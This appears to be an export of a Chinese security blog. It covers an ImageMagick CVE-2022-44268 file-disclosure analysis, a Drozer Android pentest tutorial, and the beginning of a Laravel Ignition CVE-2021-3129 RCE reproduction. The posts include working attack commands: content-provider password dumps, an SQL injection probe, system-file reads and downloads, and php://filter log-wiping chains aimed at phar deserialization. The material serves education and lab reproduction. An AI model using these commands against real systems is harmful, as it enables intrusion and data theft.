<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>hIST</td>
<td>图像直方图数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>tRNS</td>
<td>图像透明数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>oFFs</td>
<td>(专用公共数据块)</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>pHYs</td>
<td>物理像素尺寸数据块</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>sCAL</td>
<td>(专用公共数据块)</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td><strong>IDAT</strong></td>
<td>图像数据块</td>
<td>是</td>
<td>否</td>
<td>与其他IDAT连续</td>
</tr>
<tr>
<td>tIME</td>
<td>图像最后修改时间数据块</td>
<td>否</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>tEXt</td>
<td>文本信息数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>zTXt</td>
<td>压缩文本数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>fRAc</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFg</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFt</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFx</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td><strong>IEND</strong></td>
<td>图像结束数据</td>
<td>否</td>
<td>否</td>
<td>最后一个数据块</td>
</tr>
</tbody></table>
<p>数据块中有 4 个关键数据块，其中 IHDR、IDAT 和 IEND 是必填选项：</p>
<ol>
<li>文件头数据块 IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。</li>
<li>调色板数据块 PLTE（palette chunk）：必须放在图像数据块之前。</li>
<li>图像数据块 IDAT（image data chunk）：存储实际图像数据。PNG 数据允许包含多个连续的图像数据块。</li>
<li>图像结束数据 IEND（image trailer chunk）：放在文件尾部，表示 PNG 数据流结束。</li>
</ol>
<p><strong>数据块结构</strong></p>
<p>PNG文件中，每个数据块由4个部分组成，如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>字节数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Length（长度）</td>
<td>4字节</td>
<td>指定数据块中数据域的长度，其长度不超过（231－1）字节。该长度只包含数据块的长度。</td>
</tr>
<tr>
<td>Chunk Type Code（数据块类型码）</td>
<td>4字节</td>
<td>数据块类型码由ASCII字母（A-Z和a-z）组成</td>
</tr>
<tr>
<td>Chunk Data（数据块数据）</td>
<td>可变长度</td>
<td>存储按照Chunk Type Code指定的数据</td>
</tr>
<tr>
<td>CRC（循环冗余检测）</td>
<td>4字节</td>
<td>存储用来检测是否有错误的循环冗余码</td>
</tr>
</tbody></table>
<p><strong>PNG标识符</strong></p>
<p>PNG格式固定标识头是<code>89504E47 0D0A1A0A</code></p>
<p><strong>TIPS</strong></p>
<p>此处漏洞出现的位置位于<code>tEXt</code>数据块</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从补丁看到漏洞出现在<code>ReadOnePNGImage()</code>函数，在使用ImageMagick命令转换png文件时会触发该函数</p>
<p><a href="https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/coders/png.c#L2164">https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/coders/png.c#L2164</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031617149.png" alt="image-20230303145819699"></p>
<p>找到打补丁的地方，是ImageMagick在处理<code>MagickPathExtent</code>的时候，根据源码可以知道<code>FormatLocaleString()</code>用于将一个变量列表转换为字符串，<code>SetImageProperty()</code>用于将指定的字符串赋值给特定的已知属性或自由属性</p>
<p><a href="https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/coders/png.c#L3982">https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/coders/png.c#L3982</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031617895.png" alt="image-20230303151300826"></p>
<p>跟进<code>SetImageProperty()</code></p>
<p><a href="https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/MagickCore/property.c#L4360">https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/MagickCore/property.c#L4360</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031617339.png" alt="image-20230303152557017"></p>
<p>在处理<code>profile</code>属性时候，会将指定的文件转换成字符串赋值回<code>profile</code>，随后重新将<code>profile</code>的值设置回图片中</p>
<p><a href="https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/MagickCore/property.c#L4711">https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/MagickCore/property.c#L4711</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031617016.png" alt="image-20230303153256695"></p>
<p>跟进<code>FileToStringInfo()</code>，从源码得知该函数用于返回指定文件的内容，所以造成了信息泄漏漏洞</p>
<p><a href="https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/MagickCore/string.c#L1005">https://github.com/ImageMagick/ImageMagick/blob/7.1.0-49/MagickCore/string.c#L1005</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031617273.png" alt="image-20230303152951952"></p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://github.com/ImageMagick/ImageMagick/commit/05673e63c919e61ffa1107804d1138c46547a475">https://github.com/ImageMagick/ImageMagick/commit/05673e63c919e61ffa1107804d1138c46547a475</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303031510083.png" alt="image-20230303151018812"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.cvedetails.com/cve/CVE-2022-44268/">https://www.cvedetails.com/cve/CVE-2022-44268/</a></li>
<li><a href="https://xz.aliyun.com/t/12133">ImageMagick CVE-2022-44267、CVE-2022-44268漏洞分析</a></li>
<li><a href="https://juejin.cn/post/7160512633132171294">常见图片格式之二进制格式分析</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞研究</tag>
      </tags>
  </entry>
  <entry>
    <title>Drozer 入门</title>
    <url>/2020/03/25/Drozer-%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>Drozer 工具入门</p>
<span id="more"></span>

<h2 id="Drozer-安卓渗透"><a href="#Drozer-安卓渗透" class="headerlink" title="Drozer 安卓渗透"></a>Drozer 安卓渗透</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>win10 + Python2.7</p>
<h3 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h3><p><a href="https://www.yeshen.com/cn/download/fullPackage">夜神模拟器</a></p>
<h3 id="安装-Drozer"><a href="#安装-Drozer" class="headerlink" title="安装 Drozer"></a>安装 Drozer</h3><p><a href="https://labs.f-secure.com/tools/drozer/">下载Drozer</a></p>
<p><a href="https://adbshell.com/downloads">下载adb</a></p>
<p><a href="https://ibotpeaches.github.io/Apktool/install/">下载apktool</a></p>
<p><a href="https://sourceforge.net/projects/dex2jar/">下载dex2jar</a></p>
<p><a href="https://github.com/java-decompiler/jd-gui/releases">下载jd-gui</a></p>
<h3 id="模拟器安装-Drozer"><a href="#模拟器安装-Drozer" class="headerlink" title="模拟器安装 Drozer"></a>模拟器安装 Drozer</h3><p>直接把下载的 agent.apk 拖到模拟器开启就行</p>
<p><img src="https://i.loli.net/2020/03/25/q5lbu8ojfRL2GkY.png" alt="image-20200325151151218.png"></p>
<h3 id="本地开启-Drozer"><a href="#本地开启-Drozer" class="headerlink" title="本地开启 Drozer"></a>本地开启 Drozer</h3><h4 id="连接模拟器端口"><a href="#连接模拟器端口" class="headerlink" title="连接模拟器端口"></a>连接模拟器端口</h4><p>这里的62001是夜神模拟器使用的端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure>

<p>其他模拟器端口参考如下</p>
<table>
<thead>
<tr>
<th>模拟器名称</th>
<th>连接默认端口</th>
</tr>
</thead>
<tbody><tr>
<td>夜神安卓模拟器</td>
<td>62001</td>
</tr>
<tr>
<td>逍遥安卓模拟器</td>
<td>21503</td>
</tr>
<tr>
<td>BlueStacks(蓝叠安卓模拟器)</td>
<td>5555</td>
</tr>
<tr>
<td>雷电安卓模拟器</td>
<td>5555</td>
</tr>
<tr>
<td>天天安卓模拟器</td>
<td>6555</td>
</tr>
<tr>
<td>网易MuMu(安卓模拟器)</td>
<td>7555</td>
</tr>
<tr>
<td>安卓模拟器大师</td>
<td>54001</td>
</tr>
</tbody></table>
<h4 id="查看连接连接状态"><a href="#查看连接连接状态" class="headerlink" title="查看连接连接状态"></a>查看连接连接状态</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<h4 id="进入安卓-shell"><a href="#进入安卓-shell" class="headerlink" title="进入安卓 shell"></a>进入安卓 shell</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell</span><br></pre></td></tr></table></figure>

<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>把安卓的41415端口转发到本机的41415端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>

<h4 id="连接-Drozer"><a href="#连接-Drozer" class="headerlink" title="连接 Drozer"></a>连接 Drozer</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/25/B91X6Ld3pc7sy4u.png" alt="image-20200325151823660.png"></p>
<h3 id="Drozer-测试步骤"><a href="#Drozer-测试步骤" class="headerlink" title="Drozer 测试步骤"></a>Drozer 测试步骤</h3><h4 id="获取包名"><a href="#获取包名" class="headerlink" title="获取包名"></a>获取包名</h4><p>-f 后面跟 apk 的名字，这里以 sieve.apk 为例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure>

<h4 id="获取包的基本信息"><a href="#获取包的基本信息" class="headerlink" title="获取包的基本信息"></a>获取包的基本信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h4 id="确定攻击面"><a href="#确定攻击面" class="headerlink" title="确定攻击面"></a>确定攻击面</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h4 id="Acitivity"><a href="#Acitivity" class="headerlink" title="Acitivity"></a>Acitivity</h4><h5 id="获取-Activity-信息"><a href="#获取-Activity-信息" class="headerlink" title="获取 Activity 信息"></a>获取 Activity 信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h5 id="启动-activity"><a href="#启动-activity" class="headerlink" title="启动 activity"></a>启动 activity</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve 活动名称</span><br></pre></td></tr></table></figure>

<h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><h5 id="获取-Content-Provider-信息"><a href="#获取-Content-Provider-信息" class="headerlink" title="获取 Content Provider 信息"></a>获取 Content Provider 信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h5 id="检测目录遍历漏洞"><a href="#检测目录遍历漏洞" class="headerlink" title="检测目录遍历漏洞"></a>检测目录遍历漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h5 id="检测-SQL-注入漏洞"><a href="#检测-SQL-注入漏洞" class="headerlink" title="检测 SQL 注入漏洞"></a>检测 SQL 注入漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h5 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h5><p>爆破 uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<p>查询 uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span><br></pre></td></tr></table></figure>

<h5 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>

<h5 id="系统文件访问"><a href="#系统文件访问" class="headerlink" title="系统文件访问"></a>系统文件访问</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure>

<h5 id="系统文件下载"><a href="#系统文件下载" class="headerlink" title="系统文件下载"></a>系统文件下载</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br></pre></td></tr></table></figure>

<h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><h5 id="获取-Broadacast-信息"><a href="#获取-Broadacast-信息" class="headerlink" title="获取 Broadacast 信息"></a>获取 Broadacast 信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.broadcast.info -a com.icenta.sudoku.ui</span><br></pre></td></tr></table></figure>

<h5 id="空-action-攻击"><a href="#空-action-攻击" class="headerlink" title="空 action 攻击"></a>空 action 攻击</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --component com.icenta.sudoku.ui com.heyzap.sdk.ads.PackageAddedReceiver</span><br></pre></td></tr></table></figure>

<h5 id="空-extras-攻击"><a href="#空-extras-攻击" class="headerlink" title="空 extras 攻击"></a>空 extras 攻击</h5><p>这里的 action 需要查看反编译的 AndroidManifest.xml 文件，找出 receiver 对应 的 action</p>
<p><img src="https://i.loli.net/2020/03/25/f3G4uYmxsiaUZgK.png" alt="image-20200325164738846.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --action android.intent.action.PACKAGE_ADDED</span><br></pre></td></tr></table></figure>

<h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><h5 id="获取-Service-信息"><a href="#获取-Service-信息" class="headerlink" title="获取 Service 信息"></a>获取 Service 信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<h5 id="权限提升（未试验）"><a href="#权限提升（未试验）" class="headerlink" title="权限提升（未试验）"></a>权限提升（未试验）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 1 --extra string text 1 --extra string OP SEND_SMS</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Laravel Debug mode RCE复现</title>
    <url>/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>CVE-2021-3129</p>
<p>Laravel &lt;&#x3D; 8.4.2</p>
<p>Ignition &lt;&#x3D; 2.5.1</p>
</blockquote>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>在kali2020下复现</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/laravel/laravel.git	# 下载laravel源码</span><br><span class="line"><span class="built_in">cd</span> laravel											# 切换到laravel目录</span><br><span class="line">git checkout -b e849812      						# 切换到存在漏洞的分支</span><br><span class="line">composer update										# 更新composer</span><br><span class="line">composer install       								# composer安装依赖</span><br><span class="line">composer require facade/ignition==<span class="number">2</span>.<span class="number">5</span>.<span class="number">1</span>    			# 下载存在漏洞版本组件</span><br><span class="line">mv .env.example .env								# 更改.env文件</span><br><span class="line">php artisan key:generate 							# 生成Application key</span><br><span class="line">php artisan serve									# 启动服务器</span><br></pre></td></tr></table></figure>

<p> 创建<code>resource/views/hello.blade.php</code>模板</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello, &#123;&#123; $username &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> 在<code>routes/web.php</code>中添加路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/hello&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在修正未定义变量时存在一处<code>file_get_contents()</code>和一处<code>file_put_contents()</code>函数的第一参数可控，且在laravel中我们可以往log文件插入部分可控内容，且我们对log文件具有可写权限，导致我们可以通过把log文件覆写为phar文件，再通过phar反序列化实现命令执行</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈分析"><a href="#调用栈分析" class="headerlink" title="调用栈分析"></a>调用栈分析</h3><p>访问新添加的路由<code>/laravel/public/hello</code>会抛出变量名未定义的错误，出现了一个按钮并提示按样例修改模板</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281210fa90afa0a5cfb6e9438b.png" alt="image-20210525133932073" style="zoom: 67%;" />

<p>点击<code>Make variable optional</code>按钮并抓包，发生漏洞的接口就是在<code>/laravel/public/_ignition/execute-solution</code>这里，可以看到这里传入了<code>viewFile</code>参数对文件进行操作</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281211e62811b5bb60e97317a9.png" alt="image-20210525141459623"></p>
<p>通过在源码搜索<code>execute-solution</code>可以搜索到Web接口，可以看到<code>ExecuteSolutionController</code>类对象被当成函数调用，所以最终会触发其<code>__invoke()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Facade</span>\<span class="title class_">Ignition</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IgnitionServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;execute-solution&#x27;</span>, <span class="title class_">ExecuteSolutionController</span>::<span class="variable language_">class</span>) <span class="comment">// 调用__invoke()函数</span></span><br><span class="line">        -&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">IgnitionConfigValueEnabled</span>::<span class="variable language_">class</span>.<span class="string">&#x27;:enableRunnableSolutions&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;executeSolution&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>我们跟进一下它的<code>__invoke()</code>函数，第一步是初始化变量，第二部就是处理参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Facade</span>\<span class="title class_">Ignition</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getRunnableSolution</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;parameters&#x27;</span>, [])); <span class="comment">// 跟进参数处理函数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据<code>run()</code>函数，我们看到了<code>file_put_contents()</code>函数的第一个参数可控，我们还得跟进一下<code>makeOptional()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Facade</span>\<span class="title class_">Ignition</span>\<span class="title class_">Solutions</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">makeOptional</span>(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>); <span class="comment">// file_put_contents()的第一参数可控</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们又看到了<code>file_get_contents()</code>函数第一个参数可控，后面就是修正操作，即为模板中的未定义变量添加一个判断条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Facade</span>\<span class="title class_">Ignition</span>\<span class="title class_">Solutions</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]); <span class="comment">// file_get_contents()的第一参数可控</span></span><br><span class="line">        <span class="variable">$newContents</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = <span class="title function_ invoke__">token_get_all</span>(<span class="title class_">Blade</span>::<span class="title function_ invoke__">compileString</span>(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = <span class="title function_ invoke__">token_get_all</span>(<span class="title class_">Blade</span>::<span class="title function_ invoke__">compileString</span>(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">generateExpectedTokens</span>(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以把上面的代码浓缩为下面两行，简称先读后写</p>
<blockquote>
<p>应该有好些不知名CMS都有这么写过</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br></pre></td></tr></table></figure>

<h3 id="日志部分可控"><a href="#日志部分可控" class="headerlink" title="日志部分可控"></a>日志部分可控</h3><p>另外，我们可以对laravel的日志文件插入部分可控内容，默认目录是<code>storage/logs/laravel.log</code></p>
<p>比如当我们传入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">viewFile: This is the controlled part</span><br></pre></td></tr></table></figure>

<p>我们可以发现<code>laravel.log</code>文件中出现了报错信息，其中有两处<code>This is the controlled part</code>字段，同时还有一处带省略号的（提前警告这是个坑）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2021-05-27 13:08:30] local.ERROR: file_get_contents(This is the controlled part): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(This is the controlled part): failed to open stream: No such file or directory at xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php:75)</span><br><span class="line">[stacktrace]</span><br><span class="line">#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#x27;file_get_conten...&#x27;, &#x27;xxxxxx...&#x27;, 75, Array)</span><br><span class="line">#1 xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php(75): file_get_contents(&#x27;This is control...&#x27;)</span><br></pre></td></tr></table></figure>

<p>它的大体结构如下面所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[label1] payload [label2] payload [label3]</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><blockquote>
<p>官方文档：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
</blockquote>
<p>所以我们的核心问题变成了如何向log文件写入一个合法的phar文件，这里我们需要利用到强大的<code>php://filter</code>，我们可以利用特别的编码和解码方法来对我们插入的内容进行修改</p>
<p><strong>清空文件</strong></p>
<p>第一个思路是我们可以用base64在解码时会自动丢弃无效字符的方法进行清空，所以按理来说只要我们多次对内容进行base64解码，那么最终就会把所有字符丢弃</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<p>但是如果文本当中出现<code>&#39;=&#39;</code>字符，<code>base64-decode</code>会抛出错误导致写入失败</p>
<p>所以**@CHARLES FOL**使用到的是php内置的官方文档未提及的<code>consumed</code>过滤器，可以直接返回空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=consumed/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<p>自己尝试了一下如果服务器的php支持<code>zlib</code>或者<code>bzip2</code>的话，也可以利用解压失败返回空的性质进行清空</p>
